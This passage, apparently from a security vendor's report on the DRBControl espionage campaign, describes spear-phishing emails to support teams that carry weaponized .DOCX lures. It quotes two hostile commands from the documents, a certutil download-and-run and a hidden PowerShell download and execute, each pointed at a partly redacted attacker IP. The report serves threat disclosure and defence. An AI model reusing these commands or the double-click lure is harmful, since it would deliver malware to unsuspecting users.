@@ -1,0 +1,47 @@
+The Initial Compromise: Spear Phishing
+In targeted attacks, spear phishing is a common infection vector employed [1] by threat actors [2] looking to
+gain an initial foothold in their target’s infrastructure. Getting the targets’ email addresses is relatively easy,
+using generic email addresses or specific individuals’ email addresses. The campaign we expose in this
+research is not an exception: The threat actors use spear phishing to trick the recipient into opening a
+.DOCX document.
+The spear-phishing campaign we witnessed was active in May 2019. We could find two different (in terms
+of language) — but very similar — kinds of phishing content. The social engineering used in this campaign
+appears to be quite straightforward and efficient in terms of meeting the threat actors’ goals.
+The threat actor’s spear-phishing attack targets the organization’s support team.
+From: 2931436431@{BLOCKED}q[.]com
+To: support-@
+The subject changed depending on the language that the targeted support team uses. The support-
+cn team, for instance, received an email with the Chinese subject “ 注册不了的截图 ” (“cannot register
+screenshot”), while the support-jp team received a similar email with “error screenshot” as the subject.
+Moreover, documents are displayed differently.
+Figure 1. Spear-phishing document sent to the Japanese support team
+4 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations
+Figure 2. Spear-phishing document sent to the Chinese support team
+Support teams are used to receiving requests from customers, and emails that contain screen captures
+from users may also be commonplace for these teams. However, support teams should be wary of how
+unusual it could be for a user to send a .DOCX file that contains the screenshot, which requires additional
+user action (a double-click, in this case) only to show the image.
+We were able to find at least three different versions of the infecting documents. The first version, when
+double-clicked by the user, embeds an executable file that is launched and acts as a dropper for the
+malware (detected by Trend Micro as Trojan.Win32.CLAMBLING.A).
+A second version of the document embeds a .BAT file, which also acts as a downloader for the same
+malware.
+cd %temp% && certutil -urlcache -split -f http://{BLOCKED}.{BLOCKED}.18.154/debug.exe
+&&debug.exe
+Command-line content found in an infecting document, downloading and executing a second-stage malware
+The third version of the document uses PowerShell to download the malware.
+cmd /c start powershell.exe -ep Bypass -NoP -NonI -W Hidden (new-object System.Net.
+WebClient).DownloadFile(‘http://{BLOCKED}.{BLOCKED}.18.154/test.cab’,’%TEMP%\test.
+cab’); expand ‘%temp%\test.cab’ %temp% -f:* ;Start-Process ‘%TEMP%\config.exe’
+Using PowerShell to download and execute a second-stage malware
+Our analysis revealed that the first two versions execute the same file (detected as Trojan.Win32.
+CLAMBLING.A) on the infected system. We could not retrieve the test.cab file from the third version, but
+we suspect a similar final payload.
+5 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations
+Figure 3. Malicious document that tricks the user to double-click on the picture and run malicious code
+(top: “Registration information error picture”
+bottom: “Double-click to enlarge picture”)
+We also found a weaponized document from July 2017 that used a similar PowerShell code to drop
+a backdoor (analyzed later in this research as type 2), but we could not search for it in our telemetry.
+Similarly, it also tricked the user into double-clicking on an image, which triggers the code execution.
+6 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations
